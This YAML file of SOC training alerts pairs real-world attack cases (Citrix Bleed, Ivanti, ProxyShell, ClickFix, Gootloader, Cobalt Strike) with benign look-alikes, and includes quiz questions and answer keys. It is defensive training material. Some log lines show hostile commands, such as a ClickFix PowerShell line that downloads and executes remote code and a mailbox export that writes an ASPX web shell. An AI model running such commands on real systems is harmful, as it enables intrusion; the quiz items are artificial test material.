@@ -1,0 +1,314 @@
+# ON SHIFT alerts, drop 3, part 3: network, email and perimeter real-world cases + benign twins (y141-y160)
+- id: y141
+  d: network
+  src: 'Citrix NetScaler Gateway · session log'
+  t: 'VPN session token used from a second source IP'
+  h: 'vpn-gw01 · m.keller'
+  l: ['session established 06:12 from 82.x.x.x (user''s home ISP), SAML sign-in with MFA, endpoint analysis passed, device ID dev-3317', '11:48: same session token presented from 185.x.x.x (hosting ASN, new country), no authentication event, no MFA, no endpoint analysis, no device ID', 'earlier that morning: 40 requests to /oauth/idp/.well-known/openid-configuration with an oversized Host header, responses much larger than usual; gateway build is below the fix for CVE-2023-4966', 'after the switch: the 185.x.x.x source opens RDP bookmarks to 3 file servers the user has never touched']
+  v: 1
+  x: T1539
+  c: vpn-session-ip-change
+  k: [1, 2]
+  diff: 3
+  say: 'A VPN session token reappeared from a hosting network address with no new sign-in; the gateway build predates the vendor fix.'
+  tell: 'The shape of CVE-2023-4966: an oversized Host header makes the gateway leak memory, and the leaked session token is already past MFA, so the replay shows no authentication event at all. Second IP, hosting ASN, no posture check, RDP bookmarks nobody uses. Kill the session, because a password reset does nothing.'
+  q:
+    kind: contain
+    ask: 'First action?'
+    o: ['Reset the user password and close', 'Kill all active sessions on the gateway, patch, then rotate what they could reach', 'Block 185.x.x.x at the firewall only']
+    a: 1
+    why: 'A stolen session outlives a password reset. Kill sessions, patch, and rotate credentials the sessions could reach.'
+- id: y142
+  d: network
+  src: 'Citrix NetScaler Gateway · session log'
+  t: 'VPN session token used from a second source IP'
+  h: 'vpn-gw01 · t.okafor'
+  l: ['session established 07:55 from 82.x.x.x (home broadband), SAML sign-in with MFA, endpoint analysis passed, device ID dev-8841', '08:31: same session continues from 37.x.x.x (mobile carrier ASN) after the laptop moved to the user''s phone hotspot; endpoint analysis re-ran and passed, same device ID dev-8841 and client build', 'gateway build includes the fix for CVE-2023-4966; no oversized Host requests to the openid endpoint in the last 30 days', 'traffic after the move: the Outlook and Teams endpoints the session already used, no new bookmarks']
+  v: 0
+  x: T1539
+  c: vpn-session-ip-change
+  k: [1, 2]
+  diff: 3
+  trap: scary
+  say: 'A VPN session continued from a mobile carrier address after the laptop moved networks, with the same device ID and a passed posture check.'
+  tell: 'Sessions follow people across networks, and this one re-ran endpoint analysis from the new IP and presented the same device ID. The gateway is patched for CVE-2023-4966, nothing oversized hit the openid endpoint, and the traffic is mail and chat the user already had open. Compare a replay with no posture, no device and a hosting ASN.'
+- id: y143
+  d: network
+  src: 'Ivanti Connect Secure · integrity checker'
+  t: 'Integrity check result'
+  h: 'ics-gw02 · scan: weekly'
+  l: ['integrity check: 1 modified CGI under the web auth directory (hash not in the vendor manifest for the installed build) and 1 new file in a temp path', 'web log 3 days earlier: GET /api/v1/totp/user-backup-code/../../license/keys-status/ with a semicolon and a command string, from 185.x.x.x, HTTP 200', 'build is in the range affected by CVE-2023-46805 and CVE-2024-21887; the vendor mitigation XML was never imported', 'appliance egress: HTTPS to 185.x.x.x every 10 min since that hour, the only destination besides its update server and syslog']
+  v: 1
+  x: T1190
+  c: edge-appliance-integrity
+  k: [0, 1]
+  diff: 3
+  say: 'The weekly integrity check found a modified script and a new temp file on a VPN gateway, after a path traversal request days earlier.'
+  tell: 'This is the shape of CVE-2023-46805 chained with CVE-2024-21887: auth bypass through a traversal path, command injection, then a modified CGI that survives as an implant. Modified file, matching request three days earlier, and the gateway phoning home. Factory reset and rotate everything the appliance could see.'
+  q:
+    kind: contain
+    ask: 'First action?'
+    o: ['Re-run the integrity check and wait for a second result', 'Take the gateway out of service, keep a snapshot, and treat its credentials and sessions as exposed', 'Import the vendor mitigation file and keep the gateway online']
+    a: 1
+    why: 'Mitigations do not remove an implant. Isolate, preserve evidence, and treat stored credentials and sessions as exposed.'
+- id: y144
+  d: network
+  src: 'Ivanti Connect Secure · integrity checker'
+  t: 'Integrity check result'
+  h: 'ics-gw04 · scan: weekly'
+  l: ['integrity check: 3 modified files and 1 new file under the web root, found 38 min after the platform upgrade', 'all 4 hashes match the vendor manifest for the new build; package signature verified, installed from the admin console on the management VLAN by netops-admin', 'web log: no path traversal requests or command strings in the last 30 days', 'appliance egress: update server and syslog collector only']
+  v: 0
+  x: T1190
+  c: edge-appliance-integrity
+  k: [1, 3]
+  diff: 3
+  trap: scary
+  say: 'The integrity check shows three modified files and one new file on a VPN gateway, 38 minutes after an upgrade from the admin console.'
+  tell: 'Changed files are what an upgrade does. All four hashes match the vendor manifest for the new build, the package signature verified, and the install came from the admin console on the management VLAN. The bad version is a file the manifest does not know, a probe that landed, and egress to somewhere new.'
+- id: y145
+  d: network
+  src: 'Ivanti Connect Secure · web access log'
+  t: 'Path traversal request on VPN appliance'
+  h: 'ics-gw04 · 185.x.x.x'
+  l: ['GET /api/v1/totp/user-backup-code/../../license/keys-status/ from 185.x.x.x, HTTP 403, 0 bytes returned', 'source is on a published research-scanner list; the same URL hit 6 other external gateways in the last hour', 'build includes the vendor fix for CVE-2023-46805 and CVE-2024-21887, and the mitigation XML; integrity check clean this morning', 'no further requests from the source: no session, no new files, appliance egress unchanged']
+  v: 0
+  x: T1190
+  c: edge-appliance-integrity
+  k: [1, 2]
+  diff: 2
+  trap: scary
+  say: 'A path traversal request to the VPN management API from an external address got a 403 on a gateway with the vendor mitigation applied.'
+  tell: 'Internet-wide probes for the CVE-2023-46805 traversal path began right after disclosure and never stopped. This one got a 403 from a gateway with the fix and the mitigation, came from a listed research scanner that hit six other gateways, and left no session, file or egress. Probe without a result is noise.'
+- id: y146
+  d: network
+  src: 'NDR · DCE/RPC signatures'
+  t: 'Spooler notification RPC seen'
+  h: '10.8.4.77 → DC01'
+  l: ['signature "MS-RPRN coercion (PrinterBug)": RpcRemoteFindFirstPrinterChangeNotificationEx from 10.8.4.77 to DC01; the notification target in the call is the caller', '2 s later DC01$ authenticates to 10.8.4.77 over SMB with NTLM as the machine account', '10.8.4.77 has no DNS name, CMDB record or EDR agent; DC01 is a domain controller with no printers published', '28 s later: a certificate request for DC01$ reaches the CA web enrollment endpoint from 10.8.4.77 with NTLM authentication (the ESC8 relay pattern)']
+  v: 1
+  x: T1187
+  c: rpc-coercion-source
+  k: [1, 3]
+  diff: 3
+  say: 'An uninventoried host sent a spooler notification call to a domain controller, which authenticated back to it before a certificate request followed.'
+  tell: 'Spooler notification RPC aimed at a domain controller is the PrinterBug coercion: DC01$ is tricked into authenticating to the caller, and the caller relays that to AD CS web enrollment (ESC8) for a DC certificate. The callback within seconds and the certificate request from the same unmanaged IP finish the story. Revoke the certificate and close the HTTP enrollment path.'
+  q:
+    kind: pivot
+    ask: 'First pivot?'
+    o: ['Check the CA issuance log for certificates issued to DC01$ and revoke them', 'Reboot DC01', 'Disable the print spooler on all workstations']
+    a: 0
+    why: 'The relayed certificate is the durable credential. Find and revoke it before it is used for a PKINIT logon.'
+- id: y147
+  d: network
+  src: 'NDR · DCE/RPC signatures'
+  t: 'Spooler notification RPC seen'
+  h: '10.8.7.112 → PRN-SRV-02'
+  l: ['signature "MS-RPRN coercion (PrinterBug)": RpcRemoteFindFirstPrinterChangeNotificationEx from 10.8.7.112 to PRN-SRV-02; the notification target in the call is the caller', '10.8.7.112 is WS-FIN-0112, a managed workstation; PRN-SRV-02 is a registered print server hosting 14 printers for 3 subnets', 'the print server answers with ordinary RPC status updates to the client; no SMB machine-account logon, no HTTP or certificate request follows', 'same call from 120 other clients to PRN-SRV-02 this week, each right after a print job or the printer list was opened']
+  v: 0
+  x: T1187
+  c: rpc-coercion-source
+  k: [1, 2]
+  diff: 3
+  trap: scary
+  say: 'The same spooler notification call went from a managed finance workstation to a registered print server, which answered with RPC status updates.'
+  tell: 'Same signature, boring spooler. Windows print clients register for change notifications with their print server to show job status, and PRN-SRV-02 is a registered print server for three subnets. No DC target, no machine-account callback over SMB, no certificate request. The signature fires on the call, the context decides.'
+- id: y148
+  d: email
+  src: 'Exchange Server · Management log'
+  t: 'Mailbox export request created'
+  h: 'EX-MBX02 · mailbox: administrator'
+  l: ['cmdlet: New-MailboxExportRequest -Mailbox administrator -FilePath \\localhost\c$\inetpub\wwwroot\aspnet_client\error.aspx', 'IIS log minutes earlier: POST /autodiscover/autodiscover.json?@corp.com/powershell from 185.x.x.x; build is in the range of CVE-2021-34473 (ProxyShell)', 'the Mailbox Import Export role was assigned to the calling account 2 min before the cmdlet ran', 'file written under the web root; GET /aspnet_client/error.aspx returned 200 and w3wp.exe spawned cmd.exe']
+  v: 1
+  x: T1505.003
+  c: exchange-export-target
+  k: [0, 3]
+  diff: 3
+  say: 'A mailbox export request wrote an ASPX file into the mail server web root, minutes after a role assignment.'
+  tell: 'A PST export is only a file-writing primitive, and ProxyShell used it as one: the PST envelope carries an ASPX body, written under aspnet_client. A role assignment just before, an Autodiscover path trick from the internet, then w3wp spawning cmd on the first hit. Patch, hunt other .aspx files, rotate everything the server could read.'
+  q:
+    kind: pivot
+    ask: 'First pivot?'
+    o: ['Search every web root for new .aspx files and review IIS logs for the same Autodiscover pattern', 'Delete error.aspx and close', 'Restart IIS']
+    a: 0
+    why: 'One shell implies a window of exploitation. Find the others and the timeline before cleaning up.'
+- id: y149
+  d: email
+  src: 'Exchange Server · Management log'
+  t: 'Mailbox export request created'
+  h: 'EX-MBX02 · mailbox: j.smith'
+  l: ['cmdlet: New-MailboxExportRequest -Mailbox j.smith -FilePath \\FS-LEGAL01\pstexports\jsmith_hold.pst', 'caller: CORP\ediscovery-admin through PowerShell remoting from the admin jump host PAW-EX01; the Mailbox Import Export role was assigned 9 days ago through the role-group workflow', 'build is current (security update applied last month); no Autodiscover requests with path tricks in the IIS logs', 'destination is a UNC share on a file server that the Exchange servers were granted for exports; the file is a .pst, not under any web root']
+  v: 0
+  x: T1505.003
+  c: exchange-export-target
+  k: [0, 3]
+  diff: 3
+  trap: scary
+  say: 'A mailbox export request wrote a PST to a legal file share from the admin jump host, using a role assigned nine days earlier.'
+  tell: 'Same cmdlet, opposite payload. The target is a .pst on a legal file share the Exchange servers were deliberately granted, the caller is an eDiscovery admin from the jump host with a role assigned nine days ago, and IIS shows no path trick. Exports are a legal-hold chore, not a shell, unless the file name ends in .aspx and sits in a web root.'
+- id: y150
+  d: endpoint
+  src: 'EDR · process tree'
+  t: 'PowerShell started from the Run dialog'
+  h: 'WS-MKT-0307 · lchen'
+  l: ['explorer.exe → powershell.exe -w hidden -c "iwr hxxps://cdn-verify[.]help/c.txt -UseBasicParsing | iex", 11 s after a browser tab changed', 'RunMRU holds the same command; the browser process wrote the clipboard 3 s before it was pasted', 'browser history: a "Verify you are human" page on a domain registered 4 days ago, reached from a search ad; the page tells the visitor to press Win+R, Ctrl+V, Enter', 'next: powershell.exe downloads a zip to %TEMP% and starts an unsigned binary from it, then connects to 185.x.x.x:443']
+  v: 1
+  x: T1204.004
+  c: run-dialog-powershell
+  k: [0, 1, 2]
+  diff: 3
+  say: 'PowerShell was started from the Run dialog on a marketing workstation, fetching text from a new domain, eleven seconds after a browser page changed.'
+  tell: 'ClickFix: the page does the social engineering and the user does the execution, so there is no attachment and no download for the mail gateway to scan. Pasted command in the Run box, iwr piped to iex, RunMRU matching, clipboard written by the browser seconds earlier. Isolate the host; the unsigned binary is already running.'
+  q:
+    kind: contain
+    ask: 'First action?'
+    o: ['Isolate the host and pull the unsigned binary and its network indicators', 'Tell the user to close the browser tab', 'Block cdn-verify[.]help at the proxy and close']
+    a: 0
+    why: 'The payload already runs. Isolate first, then collect the binary and egress before blocking the domain.'
+- id: y151
+  d: endpoint
+  src: 'EDR · process tree'
+  t: 'PowerShell started from the Run dialog'
+  h: 'WS-OPS-0412 · mpatel'
+  l: ['explorer.exe → powershell.exe -NoProfile -File \\fs-it01.corp.com\selfservice\Reset-TeamsCache.ps1, typed in the Run dialog', 'the script carries an Authenticode signature from the corporate code-signing certificate, and its hash is in the IT script allowlist', 'intranet KB article "Teams will not start" opened 40 s earlier from the internal portal; it lists this exact path', 'the script deletes the Teams cache folder under AppData and restarts Teams; no network egress, no child process beyond Teams']
+  v: 0
+  x: T1204.004
+  c: run-dialog-powershell
+  k: [0, 1, 2]
+  diff: 2
+  trap: scary
+  say: 'PowerShell was started from the Run dialog on an operations workstation, running a script from an internal file server after an intranet article was opened.'
+  tell: 'Support has been telling people to paste things in the Run box for decades. The difference is the source: an internal file server path, an Authenticode signature from the corporate certificate, and a KB article that lists this exact command and loaded 40 seconds earlier. No iwr, no iex, no internet destination.'
+- id: y152
+  d: endpoint
+  src: 'EDR · process creation'
+  t: 'wscript.exe running a JavaScript file'
+  h: 'WS-LEG-0188 · rhale'
+  l: ['explorer.exe → wscript.exe "C:\Users\rhale\AppData\Local\Temp\Temp1_mutual-nda-template.zip\mutual nda template.js"', 'the zip was downloaded by the browser 40 s earlier from a blog site found through the search "mutual nda template"; no other visit to that site in the browser history', 'the .js is 1.8 MB for a one-page template; no document viewer was opened afterward', 'within 60 s: wscript.exe starts cscript.exe, then powershell.exe, and a scheduled task is created for a JS file in AppData']
+  v: 1
+  x: T1059.007
+  c: wscript-js-origin
+  k: [0, 1, 3]
+  diff: 3
+  say: 'A legal user ran a JavaScript file with the Windows script host straight from a zip in Temp after searching for a contract template.'
+  tell: 'Gootloader: SEO-poisoned search results for legal templates, a zip holding a JavaScript file bloated past a megabyte, double-clicked in Explorer so wscript runs it from Temp. Then cscript, PowerShell and a scheduled task for the second stage. Lawyers open documents, not .js files.'
+- id: y153
+  d: endpoint
+  src: 'EDR · process creation'
+  t: 'wscript.exe running a JavaScript file'
+  h: 'WS-LEG-0189 · tnoor'
+  l: ['userinit.exe → wscript.exe //B \\corp.com\NETLOGON\map-drives.js at user logon', 'script on the NETLOGON share, 3 KB, last modified 14 months ago by the GPO admin group; same hash on every domain controller', 'child processes: net.exe use for 4 drive letters only; no network egress, no files written', 'the same command line ran 2,300 times today across the fleet at logon']
+  v: 0
+  x: T1059.007
+  c: wscript-js-origin
+  k: [0, 1, 3]
+  diff: 2
+  trap: scary
+  say: 'The Windows script host ran a JavaScript file from the domain logon share at user logon, mapping drives on a legal workstation.'
+  tell: 'wscript on a .js is the scary part, but the parent is userinit at logon, the file sits on NETLOGON with a 14-month-old change by the GPO admin group, and it ran 2,300 times across the fleet with one command line. A browser-downloaded zip in Temp is the other kind.'
+- id: y154
+  d: email
+  src: 'Mail gateway · URL analysis'
+  t: 'Mail link goes through a redirector'
+  h: 'To: procurement@corp.com'
+  l: ['link in the body: https://redir.mediaportal.com/go?u=hxxps://m365-docshare[.]top/r/Q4-PO, an open redirect on a news portal on the sender-reputation allowlist', 'final destination: m365-docshare[.]top registered 3 days ago; the page proxies the real Microsoft sign-in and relays the session', 'sender: the usual supplier address, SPF and DKIM pass, first message in 8 months', 'at delivery the redirector returned a 302 to a clean page for the gateway''s datacenter address, and to the sign-in proxy only for residential browser addresses']
+  v: 1
+  x: T1566.002
+  c: redirector-link-destination
+  k: [1, 3]
+  diff: 3
+  say: 'A mail link goes through a news portal redirect endpoint to a sign-in page on a three-day-old domain; the gateway scan saw a clean page.'
+  tell: 'Open redirects on trusted domains launder reputation: the link starts on a portal your gateway likes, and the cloaked 302 gives a datacenter scanner a clean page while residential browsers get the sign-in proxy. The final destination, registered three days ago, is the verdict, not the first hop.'
+  q:
+    kind: tune
+    ask: 'Best tuning?'
+    o: ['Allowlist the news portal domain', 'Detonate from residential egress, follow to the final URL, and score on domain age', 'Block all redirect links']
+    a: 1
+    why: 'Cloaking beats datacenter scanners. Follow the chain from realistic egress and judge the last hop.'
+- id: y155
+  d: email
+  src: 'Mail gateway · URL analysis'
+  t: 'Mail link goes through a redirector'
+  h: 'To: procurement@corp.com'
+  l: ['link in the body: https://click.mktmail-eu.net/c/Zq3 (marketing platform click tracker on a CNAME of the vendor''s tracking domain), 302 to https://www.vendor.com/webinar/oct', 'final destination: www.vendor.com registered 11 years ago, the vendor procurement licenses; the same page for every recipient', 'sender: news@vendor.com through the vendor''s marketing platform, DKIM aligned with vendor.com, DMARC pass, List-Unsubscribe present, 3,100 recipients', 'the tracking domain appears in 40 earlier mails from this vendor in the last year; the redirect behaves identically for browser and scanner user agents']
+  v: 0
+  x: T1566.002
+  c: redirector-link-destination
+  k: [1, 3]
+  diff: 2
+  say: 'A mailing link from a marketing platform tracking domain redirects to the vendor''s own webinar page; the sender domain is aligned.'
+  tell: 'Every marketing email is a redirector: the click tracker 302s to the vendor''s own site, the same for scanners and browsers, with DKIM aligned to the vendor domain and 40 earlier mails using that tracker. Destination ownership and consistent behavior make it boring. A cloaked 302 to a new domain is the other kind.'
+- id: y156
+  d: email
+  src: 'Mail gateway · URL analysis'
+  t: 'Mail link goes through a redirector'
+  h: 'To: procurement@corp.com'
+  l: ['link was rewritten at delivery by the organization''s own URL protection (safelinks.protection.outlook.com); original URL https://www.partner-logistics.com/track?id=88213', 'original destination: partner-logistics.com, a supplier in the vendor master list for 6 years; the URL resolves to a shipment tracking page for an order procurement placed', 'sender: dispatch@partner-logistics.com, SPF, DKIM and DMARC pass, 400 prior messages in two years, reply-to on the same domain', 'detonation: the same 200 page for browser and scanner user agents, no credential form, no redirect chain beyond the rewrite']
+  v: 0
+  x: T1566.002
+  c: redirector-link-destination
+  k: [0, 1]
+  diff: 3
+  trap: scary
+  say: 'A link wrapped by the organization''s own URL protection leads to a shipment tracking page on a long-standing supplier domain.'
+  tell: 'Your own URL protection wrapped the link, so there is a redirector and it is yours. Unwrap it: the original destination is a logistics partner in the vendor master for six years, behaving the same for browser and scanner, with 400 prior messages from the same sender domain. A rewrite wrapper is not evidence.'
+- id: y157
+  d: email
+  src: 'Mail gateway · attachment analysis'
+  t: 'Encrypted archive attachment delivered'
+  h: 'To: accounts@corp.com'
+  l: ['attachment Invoice_4471.zip (AES-encrypted, contents not scannable); the body says "Password: 8841"', 'sender: m.kovac@supplier-parts.com, an existing supplier contact; the message continues a real invoice thread, sent from 185.x.x.x, and is the first message ever from that supplier with an archive', 'user opened it: the archive holds one ISO, mounted as drive E: within 2 min of delivery', 'EDR: a LNK on E: runs cmd.exe /c start rundll32.exe with a DLL from E:']
+  v: 1
+  x: T1566.001
+  c: encrypted-archive-delivery
+  k: [0, 3]
+  diff: 3
+  trap: bland
+  say: 'An encrypted zip from a known supplier contact arrived with the password in the message body, and the user mounted the ISO inside it.'
+  tell: 'A password in the same email as the archive has one purpose: to blind the gateway. Encrypted zip, ISO inside, a LNK launching rundll32 from the mounted drive is the invoice-wave chain of 2022. The supplier address is real, but the first-ever archive from a new IP says the mailbox is not in the supplier''s hands.'
+- id: y158
+  d: email
+  src: 'Mail gateway · attachment analysis'
+  t: 'Encrypted archive attachment delivered'
+  h: 'To: accounts@corp.com'
+  l: ['attachment Q3-statements.7z (AES-encrypted); the body says the password arrives by SMS, as always', 'sender: a.dupont@lawfirm-partners.com, partner firm in the contracts system for 5 years, SPF, DKIM and DMARC pass; the same kind of archive arrived on the 3rd of every month for 2 years', 'DLP exception for this sender domain owned by legal-ops, reviewed last quarter; the archive was scanned after the recipient supplied the password', 'contents: 3 PDFs and 1 XLSX, no executables or nested archives; EDR shows only the PDF viewer and Excel']
+  v: 0
+  x: T1566.001
+  c: encrypted-archive-delivery
+  k: [0, 1]
+  diff: 3
+  trap: scary
+  say: 'An encrypted archive from a partner law firm arrived on its usual monthly date; the body says the password comes by SMS.'
+  tell: 'An encrypted archive is only as bad as its delivery. Here the password travels out of band by SMS, the law firm has sent the same archive on the 3rd of the month for two years, legal-ops owns the DLP exception, and the contents are three PDFs and a spreadsheet. The scam version puts the password in the body.'
+- id: y159
+  d: network
+  src: 'NDR · TLS metadata'
+  t: 'TLS fingerprint on the intel watchlist'
+  h: 'WS-DEV-0731 → 185.x.x.x:443'
+  l: ['client JA3 matches an entry on the intel feed''s Cobalt Strike list; 38 of 38 sessions share it', 'server JARM also matches the feed''s team server list; the certificate is a 6-day-old Let''s Encrypt cert for cdn-assets-update[.]com', 'sessions every 60 s with about 10% jitter for 19 h, 1.2 KB up and 2-80 KB down, to a small VPS ASN never seen from this network', 'client process (EDR): rundll32.exe with no arguments, started by a scheduled task that runs from C:\ProgramData']
+  v: 1
+  x: T1071.001
+  c: tls-fingerprint-context
+  k: [1, 2]
+  diff: 3
+  say: 'A workstation process talks to a recently registered domain every minute with jitter for nineteen hours; both client and server fingerprints are on a watchlist.'
+  tell: 'One fingerprint is a coin flip. Client JA3 plus server JARM plus a six-day-old Let''s Encrypt domain, 60-second jitter for 19 hours and a bare rundll32 from a ProgramData task is a team server and its beacon. Contain the host, then hunt that JARM across the fleet.'
+  q:
+    kind: contain
+    ask: 'First action?'
+    o: ['Isolate the host, capture memory, and dump the scheduled task definition', 'Add the JA3 to the block list and close', 'Wait for more sessions to confirm']
+    a: 0
+    why: 'The behaviour is a live beacon. Isolate and capture before the evidence or the operator moves.'
+- id: y160
+  d: network
+  src: 'NDR · TLS metadata'
+  t: 'TLS fingerprint on the intel watchlist'
+  h: 'SRV-APP-0214 → 34.x.x.x:443'
+  l: ['client JA3 matches an entry on the intel feed''s Sliver implant list; 212 of 212 sessions from this host share it', 'server JARM is on no list; certificate is a public CA cert for ingest.metrics-vendor.com issued 5 months ago, domain registered 9 years ago', 'sessions every 30 s for months, steady 4 KB up and 400 B down, to the vendor''s published range hosted in a cloud ASN used by 300 corp hosts', 'client process (EDR): metrics-agent, a Go binary signed by the vendor, deployed by the software distribution tool to 1,900 hosts, parent services.exe']
+  v: 0
+  x: T1071.001
+  c: tls-fingerprint-context
+  k: [2, 3]
+  diff: 3
+  trap: scary
+  say: 'A server process beats to a vendor endpoint every thirty seconds, and its client fingerprint matches an implant list entry.'
+  tell: 'JA3 is a hash of how a TLS client is built, not who wrote it. Sliver is written in Go, so is half the monitoring ecosystem, and they share Go''s TLS stack. A signed agent from the software tool on 1,900 hosts, a nine-year-old vendor domain and a public cert say telemetry, not a hit.'
